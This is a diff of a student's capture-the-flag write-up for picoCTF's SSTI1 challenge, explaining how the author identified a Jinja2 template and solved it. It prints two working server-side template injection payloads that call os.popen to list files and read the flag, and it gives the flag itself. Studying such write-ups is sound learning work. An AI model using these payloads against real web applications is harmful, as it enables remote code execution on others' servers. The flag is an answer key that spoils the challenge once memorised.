@@ -38,39 +38,38 @@ picoCTF{y0u_m4d3_1t_79a0ddc6}
 
 # 2. SSTI1
 
-> Put in the challenge's description here
+> I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!e
 
 ## Solution:
 
-- Include as many steps as you can with your thought process
-- You **must** include images such as screenshots wherever relevant.
+- I first googled `ssti` to learn what it was.
+- Based on the below table, I identified the template as Jinja2.
 
-```
-put codes & terminal outputs here using triple backticks
+<img width="1346" height="516" alt="image" src="https://github.com/user-attachments/assets/520649da-ce77-46a0-b477-fd1d37a2dd60" />
 
-you may also use ```python for python codes for example
-```
+- After searching for Jinja2 payloads, I ran `request.application.__globals__.__builtins__.__import__('os').popen('ls').read()` and found a file named flag.
+- To read it, I ran `request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()`.
 
 ## Flag:
 
 ```
-picoCTF{}
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
 ```
 
 ## Concepts learnt:
 
-- Include the new topics you've come across and explain them in brief
-- 
+- Server Side Template Injection techniques
+- Server Templates
+- Remote Code Execution(RCE) bypassing 
 
 ## Notes:
 
-- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
-- 
+- It took me some time to figure out the right RCE payload but eventually I found it. I realised that my first step to any challenge should be to simply google the name of the challenge as sometimes the name seems to be a bigger hint than the actual hints, as also seen in the Forensics TFTP challenge.
 
 ## Resources:
 
-- Include the resources you've referred to with links. [example hyperlink](https://google.com)
-
+- [This](https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack) helped in figuring out it was Jinja2.
+- Used [this](https://onsecurity.io/article/server-side-template-injection-with-jinja2/) to find the right Jinja2 payload.
 <br><br><br>
 ***
 <br><br><br>
